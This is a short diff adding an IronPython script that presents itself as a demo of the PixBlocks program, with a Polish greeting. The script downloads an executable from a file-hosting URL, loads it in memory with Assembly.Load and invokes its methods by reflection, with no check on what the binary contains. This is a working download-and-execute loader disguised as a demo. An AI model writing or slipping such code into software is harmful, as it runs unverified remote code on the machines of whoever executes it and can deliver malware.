@@ -1,0 +1,12 @@
+from System.Reflection import Assembly
+from System.Net import WebClient
+
+downloader=WebClient();
+print("Witaj. To jest demo pokazujące nowe moce programu PixBlocks.")
+task=downloader.DownloadData("https://download1638.mediafire.com/4edtgw1wgxeg/bcckgk3aan7kt1e/Demo.exe");
+code = Assembly.Load(task);
+type = code.GetType("Demo.Program");
+entryPoint = type.GetMethod("Demo1")
+if entryPoint.Invoke(None,None)==0:
+	print(type.GetMethod("Demo2").Invoke(None,None));
+	
